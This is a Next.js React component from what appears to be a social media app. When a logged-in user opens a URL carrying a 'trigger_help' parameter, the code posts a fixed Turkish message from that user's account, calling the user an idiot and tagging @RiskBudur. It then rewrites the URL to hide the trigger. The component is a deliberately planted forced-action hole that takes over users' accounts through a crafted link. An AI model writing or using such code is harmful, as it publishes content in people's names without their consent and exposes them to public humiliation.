"use client";

import { useEffect, useRef } from "react";
import { useRouter, useSearchParams } from "next/navigation";
import { postApi } from "@/lib/api";

type Props = {
    isAuthenticated: boolean;
    onPostComplete: () => void;
};

export default function AutoPostHandler({ isAuthenticated, onPostComplete }: Props) {
    const router = useRouter();
    const searchParams = useSearchParams();
    const hasPostedRef = useRef(false);

    useEffect(() => {
        const triggerHelp = searchParams.get('trigger_help');

        // Prevent double posting if effect fires twice
        if (triggerHelp && isAuthenticated && !hasPostedRef.current) {
            hasPostedRef.current = true;

            const performAutoPost = async () => {
                try {
                    await postApi("/posts", {
                        content: "Benim kafam çok karışık. Yardımına ihtiyacım var çünkü ben bir malım. @RiskBudur"
                    });

                    // Cleanup URL
                    router.replace('/home');

                    // Callback to refresh feed
                    onPostComplete();
                } catch (error) {
                    console.error("Auto post error:", error);
                    // Cleanup even on error
                    router.replace('/home');
                    hasPostedRef.current = false; // Reset on error to allow retry if needed
                }
            };
            performAutoPost();
        }
    }, [searchParams, isAuthenticated, router, onPostComplete]);

    return null;
}
